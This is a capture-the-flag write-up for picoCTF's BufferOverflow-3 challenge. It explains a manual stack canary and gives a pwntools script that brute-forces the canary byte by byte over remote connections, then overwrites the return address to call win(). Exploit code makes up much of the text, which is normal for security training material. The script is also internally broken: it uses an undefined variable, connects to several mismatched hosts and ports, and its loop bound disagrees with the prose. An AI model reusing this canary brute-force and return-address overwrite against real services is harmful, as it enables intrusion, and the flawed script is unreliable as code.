# BufferOverflow-3

Challenge Description:

> Do you think you can bypass the protection and get the flag?.

> Hint1 : Maybe there's a smart way to brute-force the canary?

## Analyzing code

We see that it is a 32 bit executable which is dynamically linked and not stripped.
Also the binary does not have PIE enabled which means the addresses within the binary like the functions will be constant.

`vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5fadb3d053aee24d87bef67c56037d6d9e2b56f2, for GNU/Linux 3.2.0, not stripped`

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

We have a win function which needs to be called and a global_canary buffer which reads 4 bytes from the file `canary.txt` which we can create locally.This will be the canary in our local system which we can specify but the 4 byte canary in the server is what we have to find.

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];

void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}
```

We can read as many bytes as we want into the buffer `buf` which we have to overflow.There is a manual canary check using memcmp which gives a stack smashing message.

```c
memcpy(canary,global_canary,CANARY_SIZE);
printf("How Many Bytes will You Write Into the Buffer?\n> ");
while (x<BUFSIZE) {
    read(0,length+x,1);
    if (length[x]=='\n') break;
    x++;
}
sscanf(length,"%d",&count);

printf("Input> ");
read(0,buf,count);

if (memcmp(canary,global_canary,CANARY_SIZE)) {
   printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
   exit(-1);
}
printf("Ok... Now Where's the Flag?\n");
```

## Creating exploit

So we have to somehow bruteforce the 4 characters present in the `canary.txt` file which is in the server.We assume that the canary has only readable characters so we limit our decimal values from 65 to 122.

We bruteforce the canary byte by byte so that the memcmp does not give a error message when it checks the canary buffer in the stack with the global_buffer.

The script is given below....

```python
from pwn import *
import struct
import time

def bytes2str(input):
	return str(input,"utf-8")

elf = ELF("./vuln",checksec=False)
#p = elf.process()
p = remote("167.71.138.246", 31172)

success_msg = "Ok... Now Where's the Flag?"
#payload = b'a'*64 + b'BiRd'(Found canary)
payload = b'a'*64

for j in range(4):
	for char in range(65,122):
		byte = struct.pack("B",char)	

		#p = elf.process()
		p = remote("saturn.picoctf.net", 64197)
		p.recvuntil(b"> ")
		p.sendline(bytes(str(amount_to_write) , "utf-8"))

		p.recvuntil(b"Input> ")
		p.sendline(payload + byte)

		output = bytes2str(p.recvall()).strip()

		if success_msg in output:
			print(f"Canary byte success = {byte}")
			payload += struct.pack("B",char)
			break

print(f"Final payload = {payload}")

p = remote("saturn.picoctf.net", 51220)

p.recvuntil(b"> ")
p.sendline(b"1000")
p.recvuntil(b"Input> ")
p.sendline(payload + p32(0x41414141)*4 + p32(0x08049336))

print(p.recvall())


```
